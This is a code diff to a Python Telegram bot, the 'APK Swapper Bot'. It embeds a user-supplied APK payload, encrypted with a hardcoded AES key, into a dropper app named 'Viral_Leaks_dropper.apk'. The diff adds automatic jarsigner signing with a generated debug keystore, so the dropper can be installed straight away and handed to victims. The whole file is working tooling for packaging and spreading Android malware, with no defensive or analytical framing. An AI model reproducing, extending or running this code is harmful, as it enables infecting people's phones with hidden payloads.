@@ -1,8 +1,8 @@
 """
-APK Swapper Bot — Full version with menu
+APK Swapper Bot — Full version with menu + auto-signing
 """
 
-import os, io, zipfile, secrets, logging, asyncio
+import os, io, zipfile, secrets, logging, asyncio, subprocess, tempfile, shutil
 from pathlib import Path
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
@@ -18,15 +18,66 @@ from telegram.ext import (
 
 BOT_TOKEN    = os.getenv("BOT_TOKEN", "")
 DROPPER_PATH = Path(__file__).parent / "Viral_Leaks_dropper.apk"
+KEYSTORE     = Path(__file__).parent / "debug.keystore"
 AES_KEY_HEX  = "b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1"
 AES_KEY      = bytes.fromhex(AES_KEY_HEX)
 ASSET_NAME   = "assets/Axyra"
+
+KS_PASS  = "android"
+KS_ALIAS = "androiddebugkey"
 
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s"
 )
 log = logging.getLogger(__name__)
+
+# ─── Signing ──────────────────────────────────────────────────────────────────
+
+def _jarsigner_available() -> bool:
+    return shutil.which("jarsigner") is not None
+
+def ensure_keystore():
+    if KEYSTORE.exists():
+        return
+    log.info("Keystore nahi mili — generate kar raha hoon...")
+    subprocess.run([
+        "keytool", "-genkeypair", "-v",
+        "-keystore", str(KEYSTORE),
+        "-alias", KS_ALIAS,
+        "-keyalg", "RSA", "-keysize", "2048",
+        "-validity", "10000",
+        "-storepass", KS_PASS,
+        "-keypass",   KS_PASS,
+        "-dname", "CN=Android Debug,O=Android,C=US",
+    ], check=True, capture_output=True)
+    log.info("Keystore bani: %s", KEYSTORE)
+
+def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
+    """Returns (signed_bytes, was_signed). If jarsigner missing, returns original."""
+    if not _jarsigner_available():
+        log.warning("jarsigner nahi mila — unsigned return kar raha hoon")
+        return apk_bytes, False
+
+    ensure_keystore()
+
+    tmp = Path(tempfile.mktemp(suffix=".apk"))
+    try:
+        tmp.write_bytes(apk_bytes)
+        subprocess.run([
+            "jarsigner",
+            "-keystore",   str(KEYSTORE),
+            "-storepass",  KS_PASS,
+            "-keypass",    KS_PASS,
+            "-sigalg",     "SHA256withRSA",
+            "-digestalg",  "SHA-256",
+            "-sigfile",    "CERT",
+            str(tmp),
+            KS_ALIAS,
+        ], check=True, capture_output=True)
+        return tmp.read_bytes(), True
+    finally:
+        tmp.unlink(missing_ok=True)
 
 # ─── State ────────────────────────────────────────────────────────────────────
 
@@ -232,6 +283,15 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await prog.edit_text(f"❌ Error: {e}")
         return
 
+    await prog.edit_text("✍️ Sign ho raha hai...")
+    try:
+        new_dropper, signed = sign_apk(new_dropper)
+    except Exception as e:
+        log.exception("signing failed")
+        await prog.edit_text(f"⚠️ Sign nahi hua: {e}\nUnsigned dropper bhej raha hoon...")
+        signed = False
+
+    sign_note = "✅ Signed (debug key)" if signed else "⚠️ Unsigned — `pkg install openjdk-17` karo"
     out_name = f"dropper_{doc.file_name}"
     await prog.edit_text(f"📤 Bhej raha hoon ({len(new_dropper) // 1024} KB)...")
 
@@ -242,9 +302,8 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             f"✅ *Dropper ready!*\n\n"
             f"📦 Payload: `{doc.file_name}`\n"
             f"📏 Size: `{len(new_dropper) // 1024} KB`\n"
-            f"🔐 Key: `{AES_KEY_HEX[:24]}...`\n\n"
-            f"⚠️ *Install ke liye re-sign karo:*\n"
-            f"`uber-apk-signer.jar --apks {out_name}`"
+            f"🔐 Key: `{AES_KEY_HEX[:24]}...`\n"
+            f"✍️ Signature: {sign_note}"
         ),
         parse_mode="Markdown",
         reply_markup=InlineKeyboardMarkup([[
